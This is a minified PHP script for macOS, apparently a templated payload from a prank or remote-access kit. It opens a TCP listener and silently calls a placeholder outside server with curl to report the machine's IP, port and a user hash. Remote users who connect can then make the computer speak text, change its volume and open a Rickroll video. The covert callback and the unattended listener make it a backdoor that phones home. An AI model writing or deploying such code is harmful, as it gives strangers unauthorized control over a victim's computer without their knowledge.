#!BINARY_LOCATION
<?php define('R_IP',"/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/");define('R_SS','/^[a-zA-Z0-9\s]+$/');define('PMIN',1024);define('PMAX',65535);define('PRMT','say> ');$vl=lvl();$cv=count($vl)>0?$vl[0]:'alex';set_time_limit(0);$a=lip();$p=12345;if($argc>1){$a=$argv[1];}if($argc>2){$p=(int)$argv[2];}(preg_match(R_IP,$a))or die();(is_numeric($p)&&$p>PMIN&&$p<PMAX)or die();if(($s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP))===false){die();}if(socket_bind($s,$a,$p)===false){socket_close($s);die();}if(socket_listen($s,5)===false){socket_close($s);die();}exec("curl -s \"{{SERVER_HOST}}m.php?ip=$a&port=$p&h={{USER_HASH}}\"");do{if(($ms=socket_accept($s))===false){break;}$m="\nWelcome to the Say Socket! \n"."Type anything to say it through the socket.\n"."To quit, type 'quit'. To shut down the server type 'shutdown'.\n".PRMT;socket_write($ms,$m,strlen($m));do{$m='';if(false===($b=socket_read($ms,2048,PHP_NORMAL_READ))){break 2;}if(!$b=trim($b)){continue;}$b=strtolower($b);switch($b){case 'quit':break 2;case 'shutdown':socket_close($ms);break 3;default: $b=trim($b,' _-[]()"\'');if(preg_match('/^rickroll$/i',$b)){$cmd="open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'";exec($cmd);}else if(preg_match('/^voices$/i',$b)){foreach($vl as $v){$m.=$v."\n";}}else if(preg_match('/^voice$/i',$b,$arr)||preg_match('/^voice ([a-z]+)$/i',$b,$arr)){if(isset($arr[1])){$v=$arr[1];if(in_array($v,$vl)){$cv=$v;}else{$m.="Voice '$v' does not exist. Use 'voices' command to see a list of available voices\n";}}$m.="Current voice is: $cv\n";}else if(preg_match('/^volume (\d)$/i',$b,$arr)){if(isset($arr[1])&&is_numeric($arr[1])){$lvl=(int)$arr[1];if($lvl>9)$lvl=9;if($lvl<0)$lvl=0;$cmd="osascript -e \"set Volume $lvl\"";exec($cmd);}}else if(preg_match(R_SS,$b)){if(!ce($b)){$cmd="say -v $cv '$b'";exec($cmd);}else{$m.="Cannot say: '$b', command exists\n";}}else{$m.="Cannot say: '$b', string is too complex\n";}break;}$m.=PRMT;socket_write($ms,$m,strlen($m));}while(true);socket_close($ms);}while(true);socket_close($s);function ce($cmd){$returnVal=shell_exec("which $cmd");return (empty($returnVal)?false:true);}function lip(){for($i=0;$i<10;$i++){$cmd="ipconfig getifaddr en$i";$adr=trim(exec($cmd));if(preg_match(R_IP,$adr)){return $adr;}}return '127.0.0.1';}function lvl(){$vl=array();foreach(explode("\n",`say -v '?'`) as $l){$a=explode(' ',$l);if(isset($a[0])){$v=strtolower(trim($a[0]));if($v!=''){$vl[]=$v;}}}return $vl;}